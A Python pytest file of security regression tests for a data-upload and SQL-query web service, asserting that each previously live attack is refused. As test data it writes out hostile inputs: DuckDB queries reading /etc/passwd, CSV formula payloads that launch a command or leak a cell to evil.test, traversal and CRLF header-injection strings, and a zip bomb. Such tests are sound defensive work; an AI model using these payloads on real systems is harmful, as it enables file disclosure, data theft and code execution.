"""Security regression tests.

Each test here corresponds to a vulnerability that was live in this service.
They assert the attack is refused, not merely that the happy path still works
— so a future refactor that quietly drops a guard fails loudly.
"""

import io
import zipfile

import pandas as pd
import pytest
from fastapi.testclient import TestClient

from app.core import dataset_manager
from app.core.csv_export import to_safe_csv
from app.core import safe_sql
from app.core.safe_sql import UnsafeQueryError, run_readonly_query
from app.main import app

client = TestClient(app)


@pytest.fixture(autouse=True)
def _clear_datasets():
    dataset_manager.DATASETS.clear()
    yield
    dataset_manager.DATASETS.clear()


def _upload(name: str, content: bytes, content_type: str = "text/csv"):
    return client.post("/api/upload", files={"file": (name, content, content_type)})


def _upload_id(name: str = "d.csv", content: bytes = b"name,age\nAlice,30\nBob,25\n") -> str:
    res = _upload(name, content)
    assert res.status_code == 200, res.text
    return res.json()["dataset_id"]


# ---------------------------------------------------------------------------
# SQL sandbox — DuckDB could read, write and enumerate the host filesystem
# ---------------------------------------------------------------------------

FILESYSTEM_ATTACKS = [
    "SELECT * FROM read_csv_auto('/etc/passwd')",
    "SELECT * FROM read_csv('/etc/hosts', columns={'l':'VARCHAR'})",
    "SELECT * FROM read_json_auto('/etc/hosts')",
    "SELECT content FROM read_text('/etc/hosts')",
    "SELECT * FROM read_blob('/etc/hosts')",
    "SELECT file FROM glob('/*')",
    "SELECT * FROM read_parquet('/etc/hosts')",
]


@pytest.mark.parametrize("query", FILESYSTEM_ATTACKS)
def test_sql_cannot_read_host_files(query):
    ds_id = _upload_id()
    res = client.post("/api/query", json={"dataset_id": ds_id, "query": query})

    assert res.status_code == 400
    detail = res.json()["detail"]
    # Whatever the wording, it must be a refusal — never a row of file content.
    assert "data" not in res.json()
    assert "root:" not in detail


def test_sql_cannot_write_files(tmp_path):
    ds_id = _upload_id()
    target = tmp_path / "pwned.csv"

    res = client.post(
        "/api/query",
        json={"dataset_id": ds_id, "query": f"COPY (SELECT 'pwned') TO '{target}' (FORMAT CSV)"},
    )

    assert res.status_code == 400
    assert not target.exists(), "user SQL managed to write to the host filesystem"


def test_sql_cannot_install_or_load_extensions():
    ds_id = _upload_id()

    for query in ("INSTALL httpfs", "LOAD httpfs", "INSTALL httpfs; LOAD httpfs;"):
        res = client.post("/api/query", json={"dataset_id": ds_id, "query": query})
        assert res.status_code == 400, f"{query!r} was not refused"


def test_sql_cannot_reenable_external_access():
    ds_id = _upload_id()

    res = client.post(
        "/api/query",
        json={"dataset_id": ds_id, "query": "SET enable_external_access=true"},
    )
    assert res.status_code == 400

    # And the filesystem is still shut after the attempt.
    res = client.post(
        "/api/query",
        json={"dataset_id": ds_id, "query": "SELECT file FROM glob('/*')"},
    )
    assert res.status_code == 400


def test_sql_cannot_attach_another_database(tmp_path):
    ds_id = _upload_id()
    res = client.post(
        "/api/query",
        json={"dataset_id": ds_id, "query": f"ATTACH '{tmp_path}/x.db' AS z"},
    )
    assert res.status_code == 400
    assert not (tmp_path / "x.db").exists()


@pytest.mark.parametrize(
    "query",
    [
        "CREATE TABLE evil (a INT)",
        "DROP TABLE data",
        "INSERT INTO data VALUES ('x', 1)",
        "UPDATE data SET age = 1",
        "DELETE FROM data",
        "PRAGMA disable_verification",
    ],
)
def test_sql_rejects_non_readonly_statements(query):
    ds_id = _upload_id()
    res = client.post("/api/query", json={"dataset_id": ds_id, "query": query})
    assert res.status_code == 400


def test_sql_rejects_stacked_statements():
    """`con.execute` silently runs every statement and returns the last, so a
    trailing statement would otherwise execute unnoticed."""
    ds_id = _upload_id()
    res = client.post(
        "/api/query",
        json={"dataset_id": ds_id, "query": "SELECT 1; CREATE TABLE evil (a INT)"},
    )
    assert res.status_code == 400
    assert "one statement" in res.json()["detail"].lower()


def test_sql_happy_path_still_works():
    ds_id = _upload_id()
    res = client.post("/api/query", json={"dataset_id": ds_id, "query": "SELECT * FROM dataset"})

    assert res.status_code == 200
    body = res.json()
    assert body["rows"] == 2
    assert body["columns"] == ["name", "age"]


@pytest.mark.parametrize("query", ["DESCRIBE dataset", "SUMMARIZE dataset", "EXPLAIN SELECT 1"])
def test_sql_readonly_introspection_still_allowed(query):
    ds_id = _upload_id()
    res = client.post("/api/query", json={"dataset_id": ds_id, "query": query})
    assert res.status_code == 200


def test_sql_result_rows_are_capped():
    ds_id = _upload_id()
    res = client.post(
        "/api/query",
        json={"dataset_id": ds_id, "query": "SELECT i FROM range(100000) t(i)"},
    )
    assert res.status_code == 200
    body = res.json()
    assert body["truncated"] is True
    assert len(body["data"]) <= 100


def test_sql_query_length_is_bounded():
    ds_id = _upload_id()
    res = client.post("/api/query", json={"dataset_id": ds_id, "query": "SELECT 1" + " " * 50_000})
    assert res.status_code == 422


def test_run_readonly_query_raises_on_policy_violation():
    df = pd.DataFrame({"a": [1]})
    with pytest.raises(UnsafeQueryError):
        run_readonly_query(df, "CREATE TABLE t (a INT)")


def test_long_running_query_is_interrupted(monkeypatch):
    """A syntactically innocent query can still pin a core indefinitely."""
    monkeypatch.setattr(safe_sql, "QUERY_TIMEOUT_SECONDS", 0.5)

    ds_id = _upload_id()
    res = client.post(
        "/api/query",
        json={
            "dataset_id": ds_id,
            "query": "SELECT count(*) FROM range(1000000000000) t(i) WHERE i % 7 = 0",
        },
    )

    assert res.status_code == 408
    assert "time limit" in res.json()["detail"]


# ---------------------------------------------------------------------------
# CSV injection
# ---------------------------------------------------------------------------

FORMULA_PAYLOADS = [
    "=1+1",
    "=cmd|'/c calc'!A0",
    '=HYPERLINK("http://evil.test/?leak="&A1,"click")',
    "@SUM(1+1)",
    "+1+1",
    "-1+1",
    "\t=1+1",
    "\r=1+1",
]


@pytest.mark.parametrize("payload", FORMULA_PAYLOADS)
def test_to_safe_csv_neutralizes_cells(payload):
    df = pd.DataFrame({"col": [payload]})
    out = to_safe_csv(df)

    body = out.splitlines()[1]
    assert "'" in body
    # The dangerous character must never be the first thing in the field.
    assert not body.lstrip('"').startswith(payload[0])


@pytest.mark.parametrize("payload", FORMULA_PAYLOADS)
def test_to_safe_csv_neutralizes_headers(payload):
    df = pd.DataFrame({payload: ["value"]})
    header = to_safe_csv(df).splitlines()[0]
    assert not header.lstrip('"').startswith(payload[0])


def test_to_safe_csv_leaves_ordinary_values_intact():
    df = pd.DataFrame({"name": ["Alice"], "age": [30], "note": ["-"]})
    lines = to_safe_csv(df).splitlines()
    assert lines[0] == "name,age,note"
    assert lines[1] == "Alice,30,'-"


def test_negative_numbers_survive_export_as_numbers():
    """A real number can't carry a payload, and quoting it would corrupt the
    column's type when the file is re-imported."""
    df = pd.DataFrame({"balance": [-42.5, 17.0]})
    lines = to_safe_csv(df).splitlines()
    assert lines[1] == "-42.5"


def test_csv_upload_download_roundtrip_is_sanitized():
    ds_id = _upload_id("evil.csv", b'name,payload\nAlice,"=cmd|\'/c calc\'!A0"\n')
    res = client.get(f"/api/dataset/{ds_id}/download")

    assert res.status_code == 200
    assert "=cmd" not in res.text.replace("'=cmd", "")
    assert "'=cmd" in res.text


def test_json_upload_download_roundtrip_is_sanitized():
    """The JSON path skips the CSV repair pipeline, so it used to export raw."""
    payload = b'[{"name": "Alice", "note": "=1+1"}]'
    ds_id = _upload_id("evil.json", payload)

    res = client.get(f"/api/dataset/{ds_id}/download")
    assert res.status_code == 200
    assert "'=1+1" in res.text


def test_xlsx_upload_download_roundtrip_is_sanitized():
    from openpyxl import Workbook

    wb = Workbook()
    ws = wb.active
    ws.append(["name", "note"])
    ws.append(["Alice", "=1+1"])
    # Force a *text* cell, not a formula cell: this is the dangerous shape —
    # inert inside the workbook, live once exported to CSV and reopened.
    ws["B2"].data_type = "s"

    buffer = io.BytesIO()
    wb.save(buffer)

    ds_id = _upload_id("evil.xlsx", buffer.getvalue())
    res = client.get(f"/api/dataset/{ds_id}/download")

    assert res.status_code == 200
    assert "'=1+1" in res.text


def test_sql_derived_formula_values_are_sanitized_on_download():
    """Values a query invents were never seen by any ingest-time check."""
    df = pd.DataFrame({"col": ["=1+1"]})
    out = to_safe_csv(df)
    assert "'=1+1" in out


# ---------------------------------------------------------------------------
# Dataset enumeration / IDOR
# ---------------------------------------------------------------------------

def test_datasets_are_not_enumerable():
    """A dataset id is the capability to read and delete that dataset, so the
    old GET /api/datasets handed every visitor everyone else's uploads."""
    _upload_id("victim.csv", b"secret,value\nssn,123-45-6789\n")

    res = client.get("/api/datasets")
    assert res.status_code in (404, 405)


def test_reconcile_only_confirms_ids_the_caller_already_has():
    victim_id = _upload_id("victim.csv", b"secret,value\nssn,123-45-6789\n")
    attacker_id = _upload_id("attacker.csv", b"a,b\n1,2\n")

    res = client.post("/api/datasets/reconcile", json={"dataset_ids": [attacker_id]})

    assert res.status_code == 200
    assert res.json()["dataset_ids"] == [attacker_id]
    assert victim_id not in res.json()["dataset_ids"]


def test_reconcile_drops_unknown_and_malformed_ids():
    ds_id = _upload_id()
    res = client.post(
        "/api/datasets/reconcile",
        json={"dataset_ids": [ds_id, "../../etc/passwd", "00000000-0000-4000-8000-000000000000"]},
    )

    assert res.status_code == 200
    assert res.json()["dataset_ids"] == [ds_id]


def test_reconcile_batch_size_is_bounded():
    res = client.post(
        "/api/datasets/reconcile",
        json={"dataset_ids": [f"00000000-0000-4000-8000-{i:012d}" for i in range(500)]},
    )
    assert res.status_code == 422


def test_datasets_count_reveals_no_ids():
    ds_id = _upload_id()
    res = client.get("/api/datasets/count")

    assert res.status_code == 200
    assert res.json() == {"count": 1}
    assert ds_id not in res.text


# ---------------------------------------------------------------------------
# Path / header injection on dataset ids and filenames
# ---------------------------------------------------------------------------

@pytest.mark.parametrize(
    "bad_id",
    ["../../etc/passwd", "not-a-uuid", "'; DROP TABLE data; --", "%2e%2e%2f"],
)
def test_malformed_dataset_ids_are_refused(bad_id):
    assert client.get(f"/api/dataset/{bad_id}/download").status_code == 404
    assert client.delete(f"/api/dataset/{bad_id}").status_code == 404
    assert client.post("/api/query", json={"dataset_id": bad_id, "query": "SELECT 1"}).status_code in (404, 422)


def test_download_filename_cannot_inject_response_headers():
    ds_id = _upload_id()
    res = client.get(
        f"/api/dataset/{ds_id}/download",
        params={"filename": 'evil"\r\nX-Injected: yes\r\n\r\n.csv'},
    )

    assert res.status_code == 200
    assert "x-injected" not in {k.lower() for k in res.headers}
    disposition = res.headers["content-disposition"]
    assert "\r" not in disposition and "\n" not in disposition


def test_download_filename_cannot_traverse():
    ds_id = _upload_id()
    res = client.get(f"/api/dataset/{ds_id}/download", params={"filename": "../../../etc/passwd"})

    assert res.status_code == 200
    assert "/" not in res.headers["content-disposition"].split("filename=")[1]


# ---------------------------------------------------------------------------
# Upload limits
# ---------------------------------------------------------------------------

def test_oversized_upload_is_refused():
    payload = b"a,b\n" + (b"1,2\n" * 6_000_000)  # ~24 MB
    res = _upload("big.csv", payload)
    assert res.status_code == 413


def test_unsupported_extension_is_refused():
    assert _upload("evil.py", b"import os").status_code == 400
    assert _upload("evil.csv.exe", b"MZ").status_code == 400


def test_filename_path_traversal_is_refused_or_neutralized():
    res = _upload("../../../etc/passwd.csv", b"a,b\n1,2\n")
    # The name is stripped to its basename; the upload itself is fine.
    assert res.status_code == 200


def test_xlsx_zip_bomb_is_refused():
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as zf:
        # ~300 MB of zeros compresses to a few hundred KB.
        zf.writestr("xl/worksheets/sheet1.xml", b"\0" * (300 * 1024 * 1024))

    res = _upload("bomb.xlsx", buffer.getvalue())
    assert res.status_code == 400
    assert "expands" in res.json()["detail"]


def test_dataset_store_is_bounded():
    for _ in range(dataset_manager.MAX_DATASETS + 5):
        _upload_id()

    assert len(dataset_manager.DATASETS) <= dataset_manager.MAX_DATASETS


# ---------------------------------------------------------------------------
# Transport / headers
# ---------------------------------------------------------------------------

def test_security_headers_are_present():
    res = client.get("/")
    assert res.headers["x-content-type-options"] == "nosniff"
    assert res.headers["x-frame-options"] == "DENY"
    assert "frame-ancestors 'none'" in res.headers["content-security-policy"]


def test_cors_does_not_allow_credentials_or_arbitrary_origins():
    res = client.get("/", headers={"Origin": "https://evil.test"})
    assert res.headers.get("access-control-allow-origin") != "https://evil.test"
    assert res.headers.get("access-control-allow-credentials") != "true"


def test_oversized_content_length_is_refused_before_parsing():
    res = client.post(
        "/api/query",
        headers={"Content-Length": str(50 * 1024 * 1024), "Content-Type": "application/json"},
        content=b'{"dataset_id":"x","query":"SELECT 1"}',
    )
    assert res.status_code == 413


# ---------------------------------------------------------------------------
# Error messages
# ---------------------------------------------------------------------------

def test_upload_errors_do_not_echo_raw_file_bytes():
    res = _upload("bad.json", b'{"secret": "leak-me-\x00", not json')
    assert res.status_code == 400
    assert "leak-me" not in res.json()["detail"]
